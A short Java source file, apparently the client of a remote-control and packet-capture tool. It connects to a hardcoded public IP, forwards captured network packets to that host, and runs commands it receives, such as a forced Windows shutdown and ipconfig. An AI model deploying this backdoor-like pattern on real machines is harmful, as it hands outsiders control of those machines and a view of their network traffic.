import jpcap.packet.Packet;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.io.BufferedReader;
import java.util.ArrayList;

public class Main {
	 public static void main(String[]args) {
	        try {
				   Socket socket = new Socket("120.77.168.152", 1432);
	        	   Socket socket1 = new Socket("120.77.168.152", 1436);
//	        	   Socket socket = new Socket("127.0.0.1", 1432); 
//	        	   Socket socket1 = new Socket("127.0.0.1", 1436);  
	//        	   Socket socket = new Socket("10.21.127.223", 1432);
	  //      	   Socket socket1 = new Socket("10.21.127.223", 1436);
	               InputStream inputStream = socket.getInputStream();  
	               OutputStream outputStream = socket.getOutputStream();              
//	               ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);   
//	               ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
	               BufferedOutputStream BISoutputStream = new BufferedOutputStream (outputStream); 
	               BufferedInputStream BISinputStream = new BufferedInputStream (inputStream); 
	               //ensure connection 
	               byte b[] = cmdSet.password.getBytes();
	               BISoutputStream.write(b);
	               BISoutputStream.flush();
	               //new thread for pkt capture 
	               new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							PacketCatandFor packetCapotor = new PacketCatandFor();
							packetCapotor.packetCatandFor(socket1);
						}
					}).start();
		               
	               byte[] buffer = new byte[1024];
	               int bytesRead = 0;
	               String chunk = new String("");
	               while ((bytesRead = BISinputStream.read(buffer)) != -1) {
	               	chunk = new String(buffer, 0, bytesRead);
	               	cmdFunction(chunk);
	               	
	                }
	               
	           }catch (IOException e) {  
	                    e.printStackTrace();  
	                } 	               	               	               
	        }
	 
	   public static void cmdFunction(String chunk) throws IOException{
		if(chunk.equals("shutdown")){
			String cmdStr = "cmd.exe /c shutdown -s -t 100";
			Process proc = Runtime.getRuntime().exec(cmdStr);
		}
		if(chunk.equals("shutdownstop")){
			String cmdStr = "cmd.exe /c shutdown -a";
			Process proc = Runtime.getRuntime().exec(cmdStr);
		}
		if(chunk.equals("ipconfig")){
			String cmdStr = "cmd.exe /c ipconfig";
			Process proc = Runtime.getRuntime().exec(cmdStr);
			InputStream inputstream = proc.getInputStream();
			InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
			BufferedReader bufferedreader = new BufferedReader(inputstreamreader);
			String line = "";
			StringBuilder sb = new StringBuilder(line);
			while ((line = bufferedreader.readLine()) != null) {
					sb.append(line);
					sb.append('\n');
					System.out.println(line);
			}
		}
	   }


}
				